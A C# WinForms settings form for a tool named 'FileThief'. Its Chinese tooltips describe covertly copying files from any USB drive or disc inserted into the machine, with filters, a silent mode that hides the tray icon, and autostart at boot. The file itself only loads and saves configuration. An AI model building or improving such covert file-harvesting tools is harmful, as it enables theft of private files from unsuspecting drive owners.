using System;
using System.Windows.Forms;

namespace FileThief
{
    
    public partial class FrmSettings : Form
    {
        public FrmSettings()
        {
            InitializeComponent();
        }
        
        private void frmSettings_Load(object sender, EventArgs e)
        {
            // Load Tooltip
            toolTip1.SetToolTip(label1, "设置要复制或者不要复制的文件类型\n用|隔开\n留空则复制所有文件");
            toolTip1.SetToolTip(label2, "设置仅复制大于或小于指定大小的文件，单位 MB\n1GB = 1024MB，1MB = 1024KB\n留空则忽略大小");
            toolTip1.SetToolTip(label3, "设置复制文件的保存位置\n留空则保存在程序目录下的 Files 文件夹");
            toolTip1.SetToolTip(label4, "设置对于指定卷标的磁盘，是否从其中复制文件\n用|隔开\n留空则从所有可移动磁盘复制文件");
            toolTip1.SetToolTip(label6, "设置如何匹配文件名，仅支持正则表达式\n留空则复制所有符合上面条件的文件");
            toolTip1.SetToolTip(chkLog, "设置是否要记录操作日志");
            toolTip1.SetToolTip(label7, "设置日志的保存路径\n留空则保存在程序目录下的 FileThief.log");
            toolTip1.SetToolTip(chkLogErr, "设置是否记录错误信息\n如磁盘意外断开连接等");
            toolTip1.SetToolTip(chkLogInfo, "设置是否记录普通信息\n如复制成功等");
            toolTip1.SetToolTip(chkAutoRun, "设置是否开机自动运行程序\n需要管理员权限");
            toolTip1.SetToolTip(chkSilent, "设置是否以静默模式运行程序\n在静默模式下，不会在任务栏托盘显示图标\n可以通过手动修改 config.ini 关闭");
            
            // Load Config to GUI
            txtType.Text = ClsMain.CType;
            cbType.SelectedIndex = Convert.ToInt32(ClsMain.BType);
            txtSize.Text = ClsMain.ConSize.ToString();
            cbSize.SelectedIndex = Convert.ToInt32(ClsMain.BSize);
            txtPath.Text = ClsMain.ConPath;
            txtRegExp.Text = ClsMain.ConFileNameRegExp;
            txtLabel.Text = ClsMain.CLabel;
            cbVolume.SelectedIndex = Convert.ToInt32(ClsMain.BLabel);
            chkLog.Checked= Convert.ToBoolean(Convert.ToInt32(ClsMain.ConLog));
            txtLogPath.Text = ClsMain.ConLogPath;
            chkLogErr.Checked=Convert.ToBoolean(Convert.ToInt32(ClsMain.ConLogErr));
            chkLogInfo.Checked= Convert.ToBoolean(Convert.ToInt32(ClsMain.ConLogInfo));
            chkAutoRun.Checked= Convert.ToBoolean(Convert.ToInt32(ClsMain.ConStartup));
            chkSilent.Checked= Convert.ToBoolean(Convert.ToInt32(ClsMain.ConSilent));
            chkUSBDisk.Checked = Convert.ToBoolean(Convert.ToInt32(ClsMain.ConUSBDisk));
            chkUSBHD.Checked = Convert.ToBoolean(Convert.ToInt32(ClsMain.ConUSBHD));
            chkROM.Checked = Convert.ToBoolean(Convert.ToInt32(ClsMain.ConROM));
        }

        private void btnSave_Click(object sender, EventArgs e)
        {
            ClsMain.WriteIni("FileType", "Type",  txtType.Text, ClsMain.StrConfig);
            ClsMain.WriteIni("FileType", "TypeMode", cbType.SelectedIndex.ToString(), ClsMain.StrConfig);
            ClsMain.WriteIni("FileType", "Size", txtSize.Text, ClsMain.StrConfig);
            ClsMain.WriteIni("FileType", "SizeMode", cbSize.SelectedIndex.ToString(), ClsMain.StrConfig);
            ClsMain.WriteIni("FileType", "Path", txtPath.Text, ClsMain.StrConfig);

            ClsMain.WriteIni("FileName", "RegExp", txtRegExp.Text, ClsMain.StrConfig);

            ClsMain.WriteIni("Driver", "VolumeLabel", txtLabel.Text, ClsMain.StrConfig);
            ClsMain.WriteIni("Driver", "VolumeLabelMode", cbVolume.SelectedIndex.ToString(), ClsMain.StrConfig);

            ClsMain.WriteIni("Log", "WriteLog", Convert.ToInt32(chkLog.Checked).ToString(), ClsMain.StrConfig);
            ClsMain.WriteIni("Log", "LogPath", Application.StartupPath + "\\FileThief.log", ClsMain.StrConfig);
            ClsMain.WriteIni("Log", "LogError", Convert.ToInt32(chkLogErr.Checked).ToString(), ClsMain.StrConfig);
            ClsMain.WriteIni("Log", "LogInfo", Convert.ToInt32(chkLogInfo.Checked).ToString(), ClsMain.StrConfig);

            ClsMain.WriteIni("General", "Startup", Convert.ToInt32(chkAutoRun.Checked).ToString(), ClsMain.StrConfig);
            ClsMain.WriteIni("General", "SilentMode", Convert.ToInt32(chkSilent.Checked).ToString(), ClsMain.StrConfig);

            ClsMain.WriteIni("DriverType", "USBDisk", Convert.ToInt32(chkUSBDisk.Checked).ToString(), ClsMain.StrConfig);
            ClsMain.WriteIni("DriverType", "USBHD", Convert.ToInt32(chkUSBHD.Checked).ToString(), ClsMain.StrConfig);
            ClsMain.WriteIni("DriverType", "ROM", Convert.ToInt32(chkROM.Checked).ToString(), ClsMain.StrConfig);

            var bootStatus = ClsMain.SetAutoBoot(chkAutoRun.Checked);
            if (bootStatus == -1)
            {
                MessageBox.Show("设置开机启动失败！\n其他设置将继续保存。", @"FileThief", MessageBoxButtons.OK, MessageBoxIcon.Error);
                ClsMain.WriteIni("General", "Startup", 0.ToString(), ClsMain.StrConfig);
            }

            MessageBox.Show(@"保存成功！请重启 FileThief 以使更改生效！",@"FileThief",MessageBoxButtons.OK,MessageBoxIcon.Information);
        }

        private void btnBroSP_Click(object sender, EventArgs e)
        {
            fdb.Description = @"请选择复制文件的保存位置。";
            fdb.ShowDialog();
            txtPath.Text = fdb.SelectedPath;
        }

        private void btnBroLog_Click(object sender, EventArgs e)
        {
            sfd.Title = @"日志文件保存位置";
            sfd.CheckPathExists = true;
            if(txtPath.Text!=null) sfd.InitialDirectory = System.IO.Path.GetDirectoryName(txtLogPath.Text);
            sfd.ShowDialog();
            txtLogPath.Text = sfd.FileName;
        }

        private void btnAbout_Click(object sender, EventArgs e)
        {
            new FrmAbout().Show();
        }
    }
}

